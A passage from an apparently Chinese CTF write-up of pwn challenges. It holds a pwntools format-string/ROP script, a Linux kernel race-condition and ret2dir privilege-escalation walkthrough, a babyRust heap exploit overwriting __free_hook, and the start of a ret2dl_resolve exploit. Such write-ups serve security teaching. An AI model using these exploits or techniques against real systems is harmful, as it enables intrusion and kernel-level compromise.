            tmp = p64(addr+i)[1]
            if ta!=tmp:
                write_addr(addr+i,2)
                ta = tmp
            else:
                write_addr(addr+i,1)
            if ord(value[i]) !=0:
                se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00')
            else:
                se('%14$hhn%1955c%23$hn\x00')
            wait()
    buf = 0x601060+0x100+4
    ru('This is your gift: ')
    stack = int(ru('\n'),16)-0x118
    if stack%0x10000 > 0x2000:
        p.close()
        exit()
    ret_addr = stack - 0xe8
    se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))
    wait()
    tmp = (stack+0x40)%0x10000
    se('%c'*16+'%'+str(tmp-16)+'c%hn%'+str((163-(tmp%0x100)+0x100)%0x100)+'c%23$hhn\x00')
    wait()
    if debug:
        gdb.attach(p)
    raw_input()
    rop = 0x601060+0x200
    write_value(stack,p64(rop)[:6])
    context.arch = 'amd64'
    prbp = 0x400690
    prsp = 0x40082d
    adc = 0x4006E8
    arsp = 0x0400848
    prbx = 0x40082A 
    call = 0x400810 
    stderr = 0x601040 
    payload = p64(arsp)*3
    payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)
    payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)
    se(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\0')+payload)
    print(hex(stack))
    p.interactive()
## Race
#### 一、竞态泄露slab地址
题目很明显就是copy_to_user和copy_from_user时的竞争删除导致的漏洞，为了扩大竞争条件的窗口期需要mmap一块内存，当copy_to_user复制到用户空间时会引发缺页中断，这样可能会导致进程切换。需要注意的是复制的大小不能是8字节，不然再多的删除进程也是没用的，具体可以看copy_to_user的[实现](https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149)。由于本地和服务器环境有一些差别，竞争删除的进程数会有一点不同。
理想的效果：
|  
---|---  
test_write |  
copy_to_user |  
缺页中断 |  
| test_del  
| kfree释放buffer  
copy_to_user  
这样就可以顺利拿到slab地址
#### 二、分配大量内存，占位physmap
就mmap大量地址吧，qemu给了128M内存，进程可以顺利申请64M内存，这样就占了一半的内存，后面有50%的几率跳到控制的[physmap](https://www.cnblogs.com/0xJDchen/p/6143102.html)。（实际上找个好一点的偏移基本上100%成功）
#### 三、竞态写释放后的slab object
通过第一步获得slab地址，从而推出physmap的起始地址（这两个区域很接近，或者应该说physmap包含了slab，这点不确定，没深入源码）
为了扩大竞争条件的窗口期，我是通过将猜测的physmap地址直接写入文件（不经过缓冲区，直接写入文件，[O_DIRECT](https://www.cnblogs.com/muahao/p/7903230.html)），然后再mmap映射文件去读。后面流程和竞争读一样，copy_from_user的时候，将buffer删掉，这样就可以改写下一块空闲slab地址，然后接着open("/dev/ptmx",O_RDWR);就可以申请tty_struct到可控physmap地址上。
#### 四、查找physmap地址别名
查找mmap出来的地址，如果不为NULL就代表找到了第三步申请的tty_struct结构体。这样就可以在用户态修改内核分配的tty_struct。
#### 五、tty_struct常规用法
open("/dev/ptmx",O_RDWR);实际上会分配两个tty_struct，主从模式。实际上用户态可控的tty_struct是[pts](https://blog.csdn.net/luckywang1103/article/details/71191821)的（因为第一个tty_struct会分配到删除了的buffer地址，第二个tty_struct才会分配到physmap上），所以还要open(pts_name,
O_RDONLY | O_NOCTTY);然后才是常规的ioctl操作。
这里懒得找gadgets，就直接调用set_memory_x设置可执行，后面再跳到shellcode在内核态下执行就好了。
PS:向经典的ret2dir致敬。本来只是打算uaf加ret2dir的，后面写着写着就成伪竞态了。 :)
#### exp
[exp.c](https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/pwn/Race/exp.c)
#### reference
copy_to_user :
ret2dir : 
O_DIRECT : 
## babyRust
babyRust 源码：
出题思路来源[CVE-2019-12083](https://www.cvedetails.com/cve/CVE-2019-12083/
"CVE-2019-12083 security vulnerability details")
逆向有点恶心  
任意读十分简单，通过读got表得到libc基址，观察可发现存在double free的情况，直接写__free_hook
    from pwn import *
    libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    #p=process("./babyRust")
    context.log_level="debug"
    p=remote("207.148.126.75",60001)
    def show():
        p.recvuntil("4.exit\n")
        p.sendline("2")
    def edit(name,x,y,z,i):
        p.recvuntil("4.exit\n")
        p.sendline("3")
        p.recvuntil("input your name:")
        p.sendline(name)
        p.recvuntil(":")
        p.sendline(str(x))
        p.recvuntil(":")
        p.sendline(str(y))
        p.recvuntil(":")
        p.sendline(str(z))
        p.recvuntil(":")
        p.sendline(str(i))
    #gdb.attach(p)
    p.recvuntil("4.exit\n")
    p.sendline("1312") #Boom->S
    show()
    heap_addr=int(p.recvuntil(", ",drop=True)[2:])-0xa40
    print hex(heap_addr)
    p.sendline("1313")
    p.sendline("1314")
    edit("aaa",heap_addr+0x2ce0,0,0,0)
    show()
    p.sendline("1312")
    #show()
    print p.recv()
    p.sendline("1313")
    edit("bbb ",heap_addr+0xb18,8,8,heap_addr+0xb18)
    show()
    p.recvuntil("3,3,")
    pie_addr=u64(p.recv(8))-239480
    print hex(pie_addr)
    edit("bbb ",pie_addr+0x3be78,8,8,0)
    show()
    p.recvuntil("3,3,")
    libc_addr=u64(p.recv(8))-1161904
    print hex(libc_addr)
    edit("bbbbb",heap_addr+0x2d40,2,3,4)
    p.sendline("1314")
    p.recvuntil("4.exit\n")
    p.sendline("1")
    p.recvuntil("input your name:")
    p.sendline("z")
    p.recvuntil(":")
    p.sendline(str(0))
    p.recvuntil(":")
    p.sendline(str(4015))
    p.recvuntil(":")
    p.sendline(str(5))
    p.recvuntil(":")
    p.sendline(str(0))
    show()
    free_hook=libc_addr+libc.symbols['__free_hook']-0x28-8
    p.sendline("1312")
    edit("\x00"*0x20,free_hook,0,0,0)
    one_gadget=libc_addr+0x4f322
    p.sendline("1313")
    edit("\x00"*0x30,free_hook,2,3,one_gadget)
    p.sendline("1314")
    p.interactive()
## Mimic_note
题目给了两个二进制文件，一个是32位的，一个是64位的
主要思想是，给定相同的输入，判断32位和64位程序的输入是否相同，假如不相同就直接退出
题目是一个比较简单的堆题
我们首先来看下main函数
可以看到有4个功能
  1. new
  2. delete
  3. show
  4. edit
其中edit存在一个off by null的漏洞，利用这个漏洞可以unlink，获取任意写
在任意写之后，可以利用一个gadget，将栈转移到bss段上面，进行ROP，这个时候利用ret2dl_resolve就可以打开flag，写到某个note那里，那个note提前设好一个值，假如不相当的话，就会输出what
are you trying to do?
下面是exp
这个是预期解，不过因为mimic写得不是很好，有挺多非预期的........
    from pwn import *
    import roputils 
    def brute_flag(idx,v):
        debug=1
        #context.log_level='debug'
        rop=roputils.ROP('./mimic_note_32')
        if debug:
            p=process('./mimic')
            #p=process('./mimic_note_32')
            #p=process('./mimic_note_64')
            #gdb.attach(p)
        else:
            #p=remote('127.0.0.1',9999)